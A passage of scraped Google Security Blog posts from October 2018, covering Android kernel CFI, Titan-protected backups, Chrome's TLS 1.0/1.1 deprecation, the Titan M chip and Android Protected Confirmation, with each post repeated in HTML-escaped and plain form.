3 were benign violations caused by function pointer type mismatches. When the kernel runs into such a violation, it prints out a runtime warning that contains the call stack at the time of the failure, and the call target that failed the CFI check. Changing the code to use a correct function pointer type fixes the issue. While we have fixed all known indirect branch type mismatches in the Android kernel, similar problems may be still found in device specific drivers, for example.    CFI failure (target: [&lt;fffffff3e83d4d80&gt;] my_target_function+0x0/0xd80): ------------[ cut here ]------------ kernel BUG at kernel/cfi.c:32! Internal error: Oops - BUG: 0 [#1] PREEMPT SMP &#8230; Call trace: &#8230; [&lt;ffffff8752d00084&gt;] handle_cfi_failure+0x20/0x28 [&lt;ffffff8752d00268&gt;] my_buggy_function+0x0/0x10 &#8230;    Figure 4. An example of a kernel panic caused by a CFI failure.  Another potential pitfall are address space conflicts, but this should be less common in driver code. LLVM's CFI checks only understand kernel virtual addresses and any code that runs at another exception level or makes an indirect call to a physical address will result in a CFI violation. These types of failures can be addressed by disabling CFI for a single function using the __nocfi attribute, or even disabling CFI for entire code files using the $(DISABLE_CFI) compiler flag in the Makefile.    static int __nocfi address_space_conflict() {       void (*fn)(void);  &#8230; /* branching to a physical address trips CFI w/o __nocfi */  fn = (void *)__pa_symbol(function_name);       cpu_install_idmap();       fn();       cpu_uninstall_idmap();  &#8230; }    Figure 5. An example of fixing a CFI failure caused by an address space conflict.  Finally, like many hardening features, CFI can also be tripped by memory corruption errors that might otherwise result in random kernel crashes at a later time. These may be more difficult to debug, but memory debugging tools such as  KASAN  can help here.      Conclusion   We have implemented support for LLVM's CFI in Android kernels 4.9 and 4.14. Google's Pixel 3 will be the first Android device to ship with these protections, and we have made the feature available to all device vendors through the Android common kernel. If you are shipping a new arm64 device running Android 9, we strongly recommend enabling kernel CFI to help protect against kernel vulnerabilities.   LLVM's CFI protects indirect branches against attackers who manage to gain access to a function pointer stored in kernel memory. This makes a common method of exploiting the kernel more difficult. Our future work involves also protecting function return addresses from similar attacks using LLVM's  Shadow Call Stack , which will be available in an upcoming compiler release.                                      Posted by Sami Tolvanen, Staff Software Engineer, Android Security & Privacy   [Cross-posted from the Android Developers Blog]  Android's security model is enforced by the Linux kernel, which makes it a tempting target for attackers. We have put a lot of effort into hardening the kernel in previous Android releases and in Android 9, we continued this work by focusing on compiler-based security mitigations against code reuse attacks.  Google's Pixel 3 will be the first Android device to ship with LLVM's forward-edge Control Flow Integrity (CFI) enforcement in the kernel, and we have made CFI support available in Android kernel versions 4.9 and 4.14. This post describes how kernel CFI works and provides solutions to the most common issues developers might run into when enabling the feature.   Protecting against code reuse attacks A common method of exploiting the kernel is using a bug to overwrite a function pointer stored in memory, such as a stored callback pointer or a return address that had been pushed to the stack. This allows an attacker to execute arbitrary parts of the kernel code to complete their exploit, even if they cannot inject executable code of their own. This method of gaining code execution is particularly popular with the kernel because of the huge number of function pointers it uses, and the existing memory protections that make code injection more challenging.  CFI attempts to mitigate these attacks by adding additional checks to confirm that the kernel's control flow stays within a precomputed graph. This doesn't prevent an attacker from changing a function pointer if a bug provides write access to one, but it significantly restricts the valid call targets, which makes exploiting such a bug more difficult in practice.    Figure 1. In an Android device kernel, LLVM's CFI limits 55% of indirect calls to at most 5 possible targets and 80% to at most 20 targets.  Gaining full program visibility with Link Time Optimization (LTO) In order to determine all valid call targets for each indirect branch, the compiler needs to see all of the kernel code at once. Traditionally, compilers work on a single compilation unit (source file) at a time and leave merging the object files to the linker. LLVM's solution to CFI is to require the use of LTO, where the compiler produces LLVM-specific bitcode for all C compilation units, and an LTO-aware linker uses the LLVM back-end to combine the bitcode and compile it into native code.    Figure 2. A simplified overview of how LTO works in the kernel. All LLVM bitcode is combined, optimized, and generated into native code at link time. Linux has used the GNU toolchain for assembling, compiling, and linking the kernel for decades. While we continue to use the GNU assembler for stand-alone assembly code, LTO requires us to switch to LLVM's integrated assembler for inline assembly, and either GNU gold or LLVM's own lld as the linker. Switching to a relatively untested toolchain on a huge software project will lead to compatibility issues, which we have addressed in our arm64 LTO patch sets for kernel versions 4.9 and 4.14.  In addition to making CFI possible, LTO also produces faster code due to global optimizations. However, additional optimizations often result in a larger binary size, which may be undesirable on devices with very limited resources. Disabling LTO-specific optimizations, such as global inlining and loop unrolling, can reduce binary size by sacrificing some of the performance gains. When using GNU gold, the aforementioned optimizations can be disabled with the following additions to LDFLAGS:  LDFLAGS += -plugin-opt=-inline-threshold=0 \\            -plugin-opt=-unroll-threshold=0 Note that flags to disable individual optimizations are not part of the stable LLVM interface and may change in future compiler versions.   Implementing CFI in the Linux kernel LLVM's CFI implementation adds a check before each indirect branch to confirm that the target address points to a valid function with a correct signature. This prevents an indirect branch from jumping to an arbitrary code location and even limits the functions that can be called. As C compilers do not enforce similar restrictions on indirect branches, there were several CFI violations due to function type declaration mismatches even in the core kernel that we have addressed in our CFI patch sets for kernels 4.9 and 4.14.  Kernel modules add another complication to CFI, as they are loaded at runtime and can be compiled independently from the rest of the kernel. In order to support loadable modules, we have implemented LLVM's cross-DSO CFI support in the kernel, including a CFI shadow that speeds up cross-module look-ups. When compiled with cross-DSO support, each kernel module contains information about valid local branch targets, and the kernel looks up information from the correct module based on the target address and the modules' memory layout.    Figure 3. An example of a cross-DSO CFI check injected into an arm64 kernel. Type information is passed in X0 and the target address to validate in X1. CFI checks naturally add some overhead to indirect branches, but due to more aggressive optimizations, our tests show that the impact is minimal, and overall system performance even improved 1-2% in many cases.   Enabling kernel CFI for an Android device CFI for arm64 requires clang version >= 5.0 and binutils >= 2.27. The kernel build system also assumes that the LLVMgold.so plug-in is available in LD_LIBRARY_PATH. Pre-built toolchain binaries for clang and binutils are available in AOSP, but upstream binaries can also be used.  The following kernel configuration options are needed to enable kernel CFI:  CONFIG_LTO_CLANG=y CONFIG_CFI_CLANG=y Using CONFIG_CFI_PERMISSIVE=y may also prove helpful when debugging a CFI violation or during device bring-up. This option turns a violation into a warning instead of a kernel panic.  As mentioned in the previous section, the most common issue we ran into when enabling CFI on Pixel 3 were benign violations caused by function pointer type mismatches. When the kernel runs into such a violation, it prints out a runtime warning that contains the call stack at the time of the failure, and the call target that failed the CFI check. Changing the code to use a correct function pointer type fixes the issue. While we have fixed all known indirect branch type mismatches in the Android kernel, similar problems may be still found in device specific drivers, for example.  CFI failure (target: [ ] my_target_function+0x0/0xd80): ------------[ cut here ]------------ kernel BUG at kernel/cfi.c:32! Internal error: Oops - BUG: 0 [#1] PREEMPT SMP … Call trace: … [ ] handle_cfi_failure+0x20/0x28 [ ] my_buggy_function+0x0/0x10 …  Figure 4. An example of a kernel panic caused by a CFI failure. Another potential pitfall are address space conflicts, but this should be less common in driver code. LLVM's CFI checks only understand kernel virtual addresses and any code that runs at another exception level or makes an indirect call to a physical address will result in a CFI violation. These types of failures can be addressed by disabling CFI for a single function using the __nocfi attribute, or even disabling CFI for entire code files using the $(DISABLE_CFI) compiler flag in the Makefile.  static int __nocfi address_space_conflict() {       void (*fn)(void);  … /* branching to a physical address trips CFI w/o __nocfi */  fn = (void *)__pa_symbol(function_name);       cpu_install_idmap();       fn();       cpu_uninstall_idmap();  … }  Figure 5. An example of fixing a CFI failure caused by an address space conflict. Finally, like many hardening features, CFI can also be tripped by memory corruption errors that might otherwise result in random kernel crashes at a later time. These may be more difficult to debug, but memory debugging tools such as KASAN can help here.   Conclusion We have implemented support for LLVM's CFI in Android kernels 4.9 and 4.14. Google's Pixel 3 will be the first Android device to ship with these protections, and we have made the feature available to all device vendors through the Android common kernel. If you are shipping a new arm64 device running Android 9, we strongly recommend enabling kernel CFI to help protect against kernel vulnerabilities.  LLVM's CFI protects indirect branches against attackers who manage to gain access to a function pointer stored in kernel memory. This makes a common method of exploiting the kernel more difficult. Our future work involves also protecting function return addresses from similar attacks using LLVM's Shadow Call Stack, which will be available in an upcoming compiler release.     ", "date": "October 10, 2018"},
{"website": "Google-Security", "title": "\nGoogle and Android have your back by protecting your backups\n", "author": ["Posted by Troy Kensinger, Technical Program Manager, Android Security and Privacy"], "link": "https://security.googleblog.com/2018/10/google-and-android-have-your-back-by.html", "abstract": "                             Posted by Troy Kensinger, Technical Program Manager, Android Security and Privacy     Android is all about choice. As such, Android strives to provide users many options to protect their data. By combining  Android&#8217;s Backup Service  and  Google Cloud&#8217;s Titan Technology , Android has taken additional steps to securing users' data while maintaining their privacy.    Starting in Android Pie, devices can take advantage of a new capability where backed-up application data can only be decrypted by a key that is randomly generated at the client. This decryption key is encrypted using the user's lockscreen PIN/pattern/passcode, which isn&#8217;t known by Google. Then, this passcode-protected key material is encrypted to a  Titan security chip  on our datacenter floor. The Titan chip is configured to only release the backup decryption key when presented with a correct claim derived from the user's passcode. Because the Titan chip must authorize every access to the decryption key, it can permanently block access after too many incorrect attempts at guessing the user&#8217;s passcode, thus mitigating brute force attacks. The limited number of incorrect attempts is strictly enforced by a custom Titan firmware that cannot be updated without erasing the contents of the chip. By design, this means that no one (including Google) can access a user's backed-up application data without specifically knowing their passcode.    To increase our confidence that this new technology securely prevents anyone from accessing users' backed-up application data, the Android Security &amp; Privacy team hired global cyber security and risk mitigation expert NCC Group to complete a security audit. Some of the outcomes included positives around Google&#8217;s security design processes, validation of code quality, and that mitigations for known attack vectors were already taken into account prior to launching the service. While there were some issues discovered during this audit, engineers corrected them quickly. For more details on how the end-to-end service works and a detailed report of  NCC Group&#8217;s  findings, click  here .    Getting external reviews of our security efforts is one of many ways that Google and Android maintain transparency and openness which in turn helps users feel safe when it comes to their data. Whether it&#8217;s 100s of hours of gaming data or your personalized preferences in your favorite Google apps, our users' information is protected.     We want to acknowledge contributions from Shabsi Walfish, Software Engineering Lead, Identity and Authentication to this effort                                    Posted by Troy Kensinger, Technical Program Manager, Android Security and Privacy  Android is all about choice. As such, Android strives to provide users many options to protect their data. By combining Android’s Backup Service and Google Cloud’s Titan Technology, Android has taken additional steps to securing users' data while maintaining their privacy.  Starting in Android Pie, devices can take advantage of a new capability where backed-up application data can only be decrypted by a key that is randomly generated at the client. This decryption key is encrypted using the user's lockscreen PIN/pattern/passcode, which isn’t known by Google. Then, this passcode-protected key material is encrypted to a Titan security chip on our datacenter floor. The Titan chip is configured to only release the backup decryption key when presented with a correct claim derived from the user's passcode. Because the Titan chip must authorize every access to the decryption key, it can permanently block access after too many incorrect attempts at guessing the user’s passcode, thus mitigating brute force attacks. The limited number of incorrect attempts is strictly enforced by a custom Titan firmware that cannot be updated without erasing the contents of the chip. By design, this means that no one (including Google) can access a user's backed-up application data without specifically knowing their passcode.  To increase our confidence that this new technology securely prevents anyone from accessing users' backed-up application data, the Android Security & Privacy team hired global cyber security and risk mitigation expert NCC Group to complete a security audit. Some of the outcomes included positives around Google’s security design processes, validation of code quality, and that mitigations for known attack vectors were already taken into account prior to launching the service. While there were some issues discovered during this audit, engineers corrected them quickly. For more details on how the end-to-end service works and a detailed report of NCC Group’s findings, click here.  Getting external reviews of our security efforts is one of many ways that Google and Android maintain transparency and openness which in turn helps users feel safe when it comes to their data. Whether it’s 100s of hours of gaming data or your personalized preferences in your favorite Google apps, our users' information is protected.  We want to acknowledge contributions from Shabsi Walfish, Software Engineering Lead, Identity and Authentication to this effort     ", "date": "October 12, 2018"},
{"website": "Google-Security", "title": "\nModernizing Transport Security\n", "author": ["Posted by David Benjamin, Chrome networking"], "link": "https://security.googleblog.com/2018/10/modernizing-transport-security.html", "abstract": "                             Posted by David Benjamin, Chrome networking      *Updated on October 17, 2018 with details about changes in other browsers     TLS (Transport Layer Security) is the protocol which secures HTTPS. It has a long history stretching back to the nearly twenty-year-old  TLS 1.0  and its even older predecessor, SSL. Over that time, we have learned a lot about how to build secure protocols.     TLS 1.2  was published ten years ago to address weaknesses in TLS 1.0 and 1.1 and has enjoyed wide adoption since then. Today only 0.5% of HTTPS connections made by Chrome use TLS 1.0 or 1.1. These old versions of TLS rely on MD5 and SHA-1, both  now broken , and contain other flaws. TLS 1.0 is no longer  PCI-DSS compliant  and the TLS working group has adopted a  document  to deprecate TLS 1.0 and TLS 1.1.    In line with these industry standards, Google Chrome will deprecate TLS 1.0 and TLS 1.1 in Chrome 72. Sites using these versions will begin to see deprecation warnings in the DevTools console in that release. TLS 1.0 and 1.1 will be disabled altogether in Chrome 81. This will affect users on early release channels starting January 2020.&nbsp; Apple ,  Microsoft , and  Mozilla  have made similar announcements.    Site administrators should immediately enable TLS 1.2 or later. Depending on server software (such as Apache or nginx), this may be a configuration change or a software update. Additionally, we encourage all sites to revisit their TLS configuration. Chrome&#8217;s current criteria for modern TLS is the following:       TLS 1.2 or later.   An ECDHE- and AEAD-based cipher suite. AEAD-based cipher suites are those using AES-GCM or ChaCha20-Poly1305. ECDHE_RSA_WITH_AES_128_GCM_SHA256 is the recommended option for most sites.   The server signature should use SHA-2. Note this is not the signature in the certificate, made by the CA. Rather, it is the signature made by the server itself, using its private key.           The older options&#8212;CBC-mode cipher suites, RSA-encryption key exchange, and SHA-1 online signatures&#8212;all have known cryptographic flaws. Each has been removed in the newly-published  TLS 1.3 , which is supported in Chrome 70. We retain them at prior versions for compatibility with legacy servers, but we will be evaluating them over time for eventual deprecation.              None of these changes require obtaining a new certificate. Additionally, they are backwards-compatible. Where necessary, servers may enable both modern and legacy options, to continue to support legacy clients. Note, however, such support may carry security risks. (For example, see the  DROWN ,  FREAK , and  ROBOT  attacks.)              Over the coming Chrome releases, we will improve the DevTools Security Panel to point out deviations from these settings, and suggest improvements to the site&#8217;s configuration.              Enterprise deployments can preview the TLS 1.0 and 1.1 removal today by setting the  SSLVersionMin  policy to &#8220;tls1.2&#8221;. For enterprise deployments that need more time, this same policy can be used to re-enable TLS 1.0 or TLS 1.1 until January 2021.                                     Posted by David Benjamin, Chrome networking  *Updated on October 17, 2018 with details about changes in other browsers  TLS (Transport Layer Security) is the protocol which secures HTTPS. It has a long history stretching back to the nearly twenty-year-old TLS 1.0 and its even older predecessor, SSL. Over that time, we have learned a lot about how to build secure protocols.  TLS 1.2 was published ten years ago to address weaknesses in TLS 1.0 and 1.1 and has enjoyed wide adoption since then. Today only 0.5% of HTTPS connections made by Chrome use TLS 1.0 or 1.1. These old versions of TLS rely on MD5 and SHA-1, both now broken, and contain other flaws. TLS 1.0 is no longer PCI-DSS compliant and the TLS working group has adopted a document to deprecate TLS 1.0 and TLS 1.1.  In line with these industry standards, Google Chrome will deprecate TLS 1.0 and TLS 1.1 in Chrome 72. Sites using these versions will begin to see deprecation warnings in the DevTools console in that release. TLS 1.0 and 1.1 will be disabled altogether in Chrome 81. This will affect users on early release channels starting January 2020. Apple, Microsoft, and Mozilla have made similar announcements.  Site administrators should immediately enable TLS 1.2 or later. Depending on server software (such as Apache or nginx), this may be a configuration change or a software update. Additionally, we encourage all sites to revisit their TLS configuration. Chrome’s current criteria for modern TLS is the following:   TLS 1.2 or later. An ECDHE- and AEAD-based cipher suite. AEAD-based cipher suites are those using AES-GCM or ChaCha20-Poly1305. ECDHE_RSA_WITH_AES_128_GCM_SHA256 is the recommended option for most sites. The server signature should use SHA-2. Note this is not the signature in the certificate, made by the CA. Rather, it is the signature made by the server itself, using its private key.     The older options—CBC-mode cipher suites, RSA-encryption key exchange, and SHA-1 online signatures—all have known cryptographic flaws. Each has been removed in the newly-published TLS 1.3, which is supported in Chrome 70. We retain them at prior versions for compatibility with legacy servers, but we will be evaluating them over time for eventual deprecation.      None of these changes require obtaining a new certificate. Additionally, they are backwards-compatible. Where necessary, servers may enable both modern and legacy options, to continue to support legacy clients. Note, however, such support may carry security risks. (For example, see the DROWN, FREAK, and ROBOT attacks.)      Over the coming Chrome releases, we will improve the DevTools Security Panel to point out deviations from these settings, and suggest improvements to the site’s configuration.      Enterprise deployments can preview the TLS 1.0 and 1.1 removal today by setting the SSLVersionMin policy to “tls1.2”. For enterprise deployments that need more time, this same policy can be used to re-enable TLS 1.0 or TLS 1.1 until January 2021.     ", "date": "October 15, 2018"},
{"website": "Google-Security", "title": "\nBuilding a Titan: Better security through a tiny chip\n", "author": [], "link": "https://security.googleblog.com/2018/10/building-titan-better-security-through.html", "abstract": "                                  Posted by Nagendra Modadugu and Bill Richardson, Google Device Security Group       [Cross-posted from the  Android Developers Blog ]     At the  Made by Google  event last week, we talked about the combination of AI + Software + Hardware to help organize your information. To better protect that information at a hardware level, our new Pixel 3 and Pixel 3 XL devices include a Titan M chip.We briefly introduced Titan M and some of its benefits on our  Keyword Blog , and with this post we dive into some of its technical details.   Titan M is a second-generation, low-power security module designed and manufactured by Google, and is a part of the  Titan family . As described in the Keyword Blog  post , Titan M performs several security sensitive functions, including:      Storing and enforcing the locks and rollback counters used by  Android Verified Boot .    Securely storing secrets and rate-limiting invalid attempts at retrieving them using the  Weaver API.     Providing backing for the  Android Strongbox Keymaster  module, including  Trusted User Presence  and  Protected Confirmation . Titan M has direct electrical connections to the Pixel's side buttons, so a remote attacker can't fake button presses. These features are available to third-party apps, such as  FIDO U2F  Authentication.    Enforcing factory-reset policies, so that lost or stolen phones can only be restored to operation by the authorized owner.    Ensuring that even Google can't unlock a phone or install firmware updates without the owner's cooperation with  Insider Attack Resistance .    Including Titan M in Pixel 3 devices substantially reduces the attack surface. Because Titan M is a separate chip, the physical isolation mitigates against entire classes of hardware-level exploits such as  Rowhammer ,  Spectre , and  Meltdown . Titan M's processor, caches, memory, and persistent storage are not shared with the rest of the phone's system, so  side channel attacks  like these&#8212;which rely on subtle, unplanned interactions between internal circuits of a single component&#8212;are nearly impossible. In addition to its physical isolation, the Titan M chip contains many defenses to protect against external attacks.   But Titan M is not just a hardened security microcontroller, but rather a full-lifecycle approach to security with Pixel devices in mind. Titan M's security takes into consideration all the features visible to Android down to the lowest level physical and electrical circuit design and extends beyond each physical device to our supply chain and manufacturing processes. At the physical level, we incorporated essential features optimized for the mobile experience: low power usage, low-latency, hardware crypto acceleration, tamper detection, and secure, timely firmware updates. We improved and invested in the supply chain for Titan M by creating a custom provisioning process, which provides us with transparency and control starting from the earliest silicon stages.   Finally, in the interest of transparency, the Titan M firmware source code will be publicly available soon. While Google holds the root keys necessary to sign Titan M firmware, it will be possible to reproduce binary builds based on the public source for the purpose of binary transparency.     A closer look at Titan M             Titan (left) and Titan M (right)      Titan M's CPU is an ARM Cortex-M3 microprocessor specially hardened against side-channel attacks and augmented with defensive features to detect and respond to abnormal conditions. The Titan M CPU core also exposes several control registers, which can be used to taper access to chip configuration settings and peripherals. Once powered on, Titan M verifies the signature of its flash-based firmware using a public key built into the chip's silicon. If the signature is valid, the flash is locked so it can't be modified, and then the firmware begins executing.   Titan M also features several hardware accelerators: AES, SHA, and a programmable big number coprocessor for public key algorithms. These accelerators are flexible and can either be initialized with keys provided by firmware or with chip-specific and hardware-bound keys generated by the Key Manager module. Chip-specific keys are generated internally based on entropy derived from the True Random Number Generator (TRNG), and thus such keys are never externally available outside the chip over its entire lifetime.   While implementing Titan M firmware, we had to take many system constraints into consideration.  For example, packing as many security features into Titan M's 64 Kbytes of RAM required all firmware to execute exclusively off the stack. And to reduce flash-wear, RAM contents can be preserved even during low-power mode when most hardware modules are turned off.    The diagram below provides a high-level view of the chip components described here.           Better security through transparency and innovation  At the heart of our implementation of Titan M are two broader trends: transparency and building a platform for future innovation.    Transparency around every step of the design process &#8212; from logic gates to boot code to the applications &#8212; gives us confidence in the defenses we're providing for our users. We know what's inside, how it got there, how it works, and who can make changes.    Custom hardware allows us to provide new features, capabilities, and performance not readily available in off-the-shelf components. These changes allow higher assurance use cases like two-factor authentication, medical device control, P2P payments, and others that we will help develop down the road.    As more of our lives are bound up in our phones, keeping those phones secure and trustworthy is increasingly important. Google takes that responsibility seriously. Titan M is just the latest step in our continuing efforts to improve the privacy and security of all our users.                                       Posted by Nagendra Modadugu and Bill Richardson, Google Device Security Group   [Cross-posted from the Android Developers Blog]  At the Made by Google event last week, we talked about the combination of AI + Software + Hardware to help organize your information. To better protect that information at a hardware level, our new Pixel 3 and Pixel 3 XL devices include a Titan M chip.We briefly introduced Titan M and some of its benefits on our Keyword Blog, and with this post we dive into some of its technical details.  Titan M is a second-generation, low-power security module designed and manufactured by Google, and is a part of the Titan family. As described in the Keyword Blog post, Titan M performs several security sensitive functions, including:   Storing and enforcing the locks and rollback counters used by Android Verified Boot.  Securely storing secrets and rate-limiting invalid attempts at retrieving them using the Weaver API.  Providing backing for the Android Strongbox Keymaster module, including Trusted User Presence and Protected Confirmation. Titan M has direct electrical connections to the Pixel's side buttons, so a remote attacker can't fake button presses. These features are available to third-party apps, such as FIDO U2F Authentication.  Enforcing factory-reset policies, so that lost or stolen phones can only be restored to operation by the authorized owner.  Ensuring that even Google can't unlock a phone or install firmware updates without the owner's cooperation with Insider Attack Resistance.  Including Titan M in Pixel 3 devices substantially reduces the attack surface. Because Titan M is a separate chip, the physical isolation mitigates against entire classes of hardware-level exploits such as Rowhammer, Spectre, and Meltdown. Titan M's processor, caches, memory, and persistent storage are not shared with the rest of the phone's system, so side channel attacks like these—which rely on subtle, unplanned interactions between internal circuits of a single component—are nearly impossible. In addition to its physical isolation, the Titan M chip contains many defenses to protect against external attacks.  But Titan M is not just a hardened security microcontroller, but rather a full-lifecycle approach to security with Pixel devices in mind. Titan M's security takes into consideration all the features visible to Android down to the lowest level physical and electrical circuit design and extends beyond each physical device to our supply chain and manufacturing processes. At the physical level, we incorporated essential features optimized for the mobile experience: low power usage, low-latency, hardware crypto acceleration, tamper detection, and secure, timely firmware updates. We improved and invested in the supply chain for Titan M by creating a custom provisioning process, which provides us with transparency and control starting from the earliest silicon stages.  Finally, in the interest of transparency, the Titan M firmware source code will be publicly available soon. While Google holds the root keys necessary to sign Titan M firmware, it will be possible to reproduce binary builds based on the public source for the purpose of binary transparency.   A closer look at Titan M     Titan (left) and Titan M (right)   Titan M's CPU is an ARM Cortex-M3 microprocessor specially hardened against side-channel attacks and augmented with defensive features to detect and respond to abnormal conditions. The Titan M CPU core also exposes several control registers, which can be used to taper access to chip configuration settings and peripherals. Once powered on, Titan M verifies the signature of its flash-based firmware using a public key built into the chip's silicon. If the signature is valid, the flash is locked so it can't be modified, and then the firmware begins executing.  Titan M also features several hardware accelerators: AES, SHA, and a programmable big number coprocessor for public key algorithms. These accelerators are flexible and can either be initialized with keys provided by firmware or with chip-specific and hardware-bound keys generated by the Key Manager module. Chip-specific keys are generated internally based on entropy derived from the True Random Number Generator (TRNG), and thus such keys are never externally available outside the chip over its entire lifetime.  While implementing Titan M firmware, we had to take many system constraints into consideration.  For example, packing as many security features into Titan M's 64 Kbytes of RAM required all firmware to execute exclusively off the stack. And to reduce flash-wear, RAM contents can be preserved even during low-power mode when most hardware modules are turned off.   The diagram below provides a high-level view of the chip components described here.     Better security through transparency and innovation At the heart of our implementation of Titan M are two broader trends: transparency and building a platform for future innovation.   Transparency around every step of the design process — from logic gates to boot code to the applications — gives us confidence in the defenses we're providing for our users. We know what's inside, how it got there, how it works, and who can make changes.   Custom hardware allows us to provide new features, capabilities, and performance not readily available in off-the-shelf components. These changes allow higher assurance use cases like two-factor authentication, medical device control, P2P payments, and others that we will help develop down the road.   As more of our lives are bound up in our phones, keeping those phones secure and trustworthy is increasingly important. Google takes that responsibility seriously. Titan M is just the latest step in our continuing efforts to improve the privacy and security of all our users.     ", "date": "October 17, 2018"},
{"website": "Google-Security", "title": "\nAndroid Protected Confirmation: Taking transaction security to the next level\n", "author": ["Posted by Janis Danisevskis, Information Security Engineer, Android Security"], "link": "https://security.googleblog.com/2018/10/android-protected-confirmation-taking.html", "abstract": "                             Posted by Janis Danisevskis, Information Security Engineer, Android Security      [Cross-posted from the  Android Developers Blog ]     In Android Pie, we introduced Android Protected Confirmation, the first major mobile OS API that leverages a hardware protected user interface (Trusted UI) to perform critical transactions completely outside the main mobile operating system. This Trusted UI protects the choices you make from fraudulent apps or a compromised operating system. When an app invokes Protected Confirmation, control is passed to the Trusted UI, where transaction data is displayed and user confirmation of that data's correctness is obtained.           Once confirmed, your intention is cryptographically authenticated and unforgeable when conveyed to the relying party, for example, your bank. Protected Confirmation increases the bank's confidence that it acts on your behalf, providing a higher level of protection for the transaction.     Protected Confirmation also adds additional security relative to other forms of secondary authentication, such as a One Time Password or  Transaction Authentication Number .  These mechanisms can be frustrating for mobile users and also fail to protect against a compromised device that can corrupt transaction data or intercept one-time confirmation text messages.     Once the user approves a transaction, Protected Confirmation digitally signs the confirmation message. Because the signing key never leaves the Trusted UI's hardware sandbox, neither app malware nor a compromised operating system can fool the user into authorizing anything. Protected Confirmation signing keys are created using Android's standard  AndroidKeyStore  API. Before it can start using Android Protected Confirmation for end-to-end secure transactions, the app must enroll the public KeyStore key and its  Keystore Attestation  certificate with the remote relying party. The attestation certificate certifies that the key can only be used to sign Protected Confirmations.   There are many possible use cases for Android Protected Confirmation. At Google I/O 2018, the  What's new in Android security  session showcased partners planning to leverage Android Protected Confirmation in a variety of ways, including Royal Bank of Canada person to person money transfers; Duo Security, Nok Nok Labs, and ProxToMe for user authentication; and Insulet Corporation and Bigfoot Biomedical, for medical device control.   Insulet, a global leading manufacturer of tubeless patch insulin pumps, has demonstrated how they can modify their FDA cleared Omnipod DASH TM Insulin management system in a test environment to leverage Protected Confirmation to confirm the amount of insulin to be injected. This technology holds the promise for improved quality of life and reduced cost by enabling a person with diabetes to leverage their convenient, familiar, and secure smartphone for control rather than having to rely on a secondary, obtrusive, and expensive remote control device. (Note: The Omnipod DASH&#8482; System is not cleared for use with Pixel 3 mobile device or Protected Confirmation).               This work is fulfilling an important need in the industry.  Since smartphones do not fit the mold of an FDA approved medical device, we've been working with FDA as part of  DTMoSt , an industry-wide consortium, to define a standard for phones to safely control medical devices, such as insulinSince smartphones do not fit the mold of an FDA approved medical device, we've been working with FDA as part of  DTMoSt , an industry-wide consortium, to define a standard for phones to safely control medical devices, such as insulin pumps.  A technology like Protected Confirmation plays an important role in gaining higher assurance of user intent and medical safety.    To integrate Protected Confirmation into your app, check out the  Android Protected Confirmation training article . Android Protected Confirmation is an optional feature in Android Pie. Because it has low-level hardware dependencies, Protected Confirmation may not be supported by all devices running Android Pie. Google Pixel 3 and 3XL devices are the first to support Protected Confirmation, and we are working closely with other manufacturers to adopt this market-leading security innovation on more devices.                                    Posted by Janis Danisevskis, Information Security Engineer, Android Security  [Cross-posted from the Android Developers Blog]  In Android Pie, we introduced Android Protected Confirmation, the first major mobile OS API that leverages a hardware protected user interface (Trusted UI) to perform critical transactions completely outside the main mobile operating system. This Trusted UI protects the choices you make from fraudulent apps or a compromised operating system. When an app invokes Protected Confirmation, control is passed to the Trusted UI, where transaction data is displayed and user confirmation of that data's correctness is obtained.     Once confirmed, your intention is cryptographically authenticated and unforgeable when conveyed to the relying party, for example, your bank. Protected Confirmation increases the bank's confidence that it acts on your behalf, providing a higher level of protection for the transaction.    Protected Confirmation also adds additional security relative to other forms of secondary authentication, such as a One Time Password or Transaction Authentication Number.  These mechanisms can be frustrating for mobile users and also fail to protect against a compromised device that can corrupt transaction data or intercept one-time confirmation text messages.    Once the user approves a transaction, Protected Confirmation digitally signs the confirmation message. Because the signing key never leaves the Trusted UI's hardware sandbox, neither app malware nor a compromised operating system can fool the user into authorizing anything. Protected Confirmation signing keys are created using Android's standard AndroidKeyStore API. Before it can start using Android Protected Confirmation for end-to-end secure transactions, the app must enroll the public KeyStore key and its Keystore Attestation certificate with the remote relying party. The attestation certificate certifies that the key can only be used to sign Protected Confirmations.  There are many possible use cases for Android Protected Confirmation. At Google I/O 2018, the What's new in Android security session showcased partners planning to leverage Android Protected Confirmation in a variety of ways, including Royal Bank of Canada person to person money transfers; Duo Security, Nok Nok Labs, and ProxToMe for user authentication; and Insulet Corporation and Bigfoot Biomedical, for medical device control.  Insulet, a global leading manufacturer of tubeless patch insulin pumps, has demonstrated how they can modify their FDA cleared Omnipod DASH TM Insulin management system in a test environment to leverage Protected Confirmation to confirm the amount of insulin to be injected. This technology holds the promise for improved quality of life and reduced cost by enabling a person with diabetes to leverage their convenient, familiar, and secure smartphone for control rather than having to rely on a secondary, obtrusive, and expensive remote control device. (Note: The Omnipod DASH™ System is not cleared for use with Pixel 3 mobile device or Protected Confirmation).       This work is fulfilling an important need in the industry.  Since smartphones do not fit the mold of an FDA approved medical device, we've been working with FDA as part of DTMoSt, an industry-wide consortium, to define a standard for phones to safely control medical devices, such as insulinSince smartphones do not fit the mold of an FDA approved medical device, we've been working with FDA as part of DTMoSt, an industry-wide consortium, to define a standard for phones to safely control medical devices, such as insulin pumps.  A technology like Protected Confirmation plays an important role in gaining higher assurance of user intent and medical safety.   To integrate Protected Confirmation into your app, check out the Android Protected Confirmation training article. Android Protected Confirmation is an optional feature in Android Pie. Because it has low-level hardware dependencies, Protected Confirmation may not be supported by all devices running Android Pie. Google Pixel 3 and 3XL devices are the first to support Protected Confirmation, and we are working closely with other manufacturers to adopt this market-leading security innovation on more devices.     ", "date": "October 19, 2018"},
